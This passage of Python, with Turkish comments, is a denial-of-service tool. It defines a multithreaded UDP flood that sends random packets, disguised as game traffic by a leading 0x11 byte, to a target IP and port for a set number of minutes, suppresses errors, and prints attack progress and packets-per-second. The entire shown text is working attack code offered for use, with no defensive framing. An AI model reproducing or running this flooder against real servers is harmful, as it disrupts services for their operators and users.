# ---------- YARDIMCI FONKSIYONLAR ----------
def random_packet_size(min_size=64, max_size=1024):
    return random.randint(min_size, max_size)

def random_payload(size):
    return bytes(random.getrandbits(8) for _ in range(size))

def random_hex_payload(size):
    # Ger√Іek√Іi oyun paketi taklidi
    return b'\x11' + random_payload(size-1)

# ---------- UDP FLOOD THREAD ----------
stop_event = threading.Event()
packets_sent = 0
lock = threading.Lock()

def udp_flood(target_ip, target_port, duration_sec, packet_size, delay_ms):
    global packets_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration_sec
    local_count = 0
    while time.time() < end_time and not stop_event.is_set():
        try:
            payload = random_hex_payload(packet_size)
            sock.sendto(payload, (target_ip, target_port))
            local_count += 1
            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)
        except Exception as e:
            # Hata bastƒ±rƒ±lƒ±r, devam eder
            pass
    with lock:
        packets_sent += local_count

def start_flood(ip, port, duration_min, threads, pkt_size, delay_ms):
    duration_sec = duration_min * 60
    threads_list = []
    print(f"{Colors.GREEN}[+] Hedef: {ip}:{port}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] S√Љre: {duration_min} dakika ({duration_sec} saniye){Colors.RESET}")
    print(f"{Colors.GREEN}[+] Thread sayƒ±sƒ±: {threads}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Paket boyutu: ~{pkt_size} byte{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Gecikme: {delay_ms} ms{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Saldƒ±rƒ± ba≈Яlƒ±yor...{Colors.RESET}")
    start_ts = time.time()
    for _ in range(threads):
        t = threading.Thread(target=udp_flood, args=(ip, port, duration_sec, pkt_size, delay_ms))
        t.start()
        threads_list.append(t)
    # S√Љre bitene kadar bekle
    for t in threads_list:
        t.join()
    elapsed = time.time() - start_ts
    print(f"{Colors.CYAN}[+] Tamamlandƒ±! Toplam paket: {packets_sent}{Colors.RESET}")
    print(f"{Colors.MAGENTA}[+] Ort. hƒ±z: {packets_sent/elapsed:.2f} pps{Colors.RESET}")

